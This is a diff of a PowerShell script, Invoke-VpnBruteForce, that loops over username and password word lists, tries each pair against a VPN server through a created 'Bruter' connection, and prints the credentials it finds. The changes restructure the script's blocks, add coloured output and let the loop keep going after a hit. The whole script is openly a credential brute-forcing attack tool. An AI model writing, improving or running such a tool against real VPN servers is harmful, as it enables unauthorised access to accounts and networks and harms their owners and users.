@@ -47,10 +47,8 @@ function Invoke-VpnBruteForce{
         [Validateset('Pptp','L2tp','Ikev2','Automatic')]
         [Alias('tt')]
         [string]
-        $TunType
-        
-        
-        )
+        $TunType)        
+
 
 
 BEGIN{
@@ -58,11 +56,14 @@ BEGIN{
     $UsernameFilePath = Get-Content $UsernameFilePath
     $PasswordFilePath = Get-Content $PasswordFilePath
 
+}
+
+PROCESS{
     $Checkvpn = Get-VpnConnection
         
         if ($Checkvpn.ConnectionStatus -cmatch 'Connected'){
 
-        echo '!!Your Connected By Your Bruter Connection First Disconnect!!'
+        Write-Host '!!Your Connected By Your Bruter Connection First Disconnect!!' -ForegroundColor red -BackgroundColor Black
         return}
 
 
@@ -76,10 +77,6 @@ BEGIN{
             Add-VpnConnection -name Bruter -ServerAddress $ServerAddress -TunnelType $TunType               
            
         }
-
-}
-
-PROCESS{
 
     
     foreach ($username in $UsernameFilePath){
@@ -98,12 +95,12 @@ PROCESS{
             
                             {Write-Host "[-]$username : $Password" -ForegroundColor red -BackgroundColor Black}
              
-                        else
+                        else{
             
-                            {echo '  YES !!!!!Your Username & Password Found!!!!!  '
-                            echo [+]username: $UsernameFilePath[$x]
-                            echo [+]password: $PasswordFilePath[$y]
-                            exit}
+                             Write-Host '[+]YES !!!!!Your Username & Password Found!!!!!' -ForegroundColor green -BackgroundColor Black
+                             Write-Host  [+]username: $username -ForegroundColor green -BackgroundColor Black
+                             Write-Host  [+]password: $Password -ForegroundColor green -BackgroundColor Black
+                        }
 
             }
 
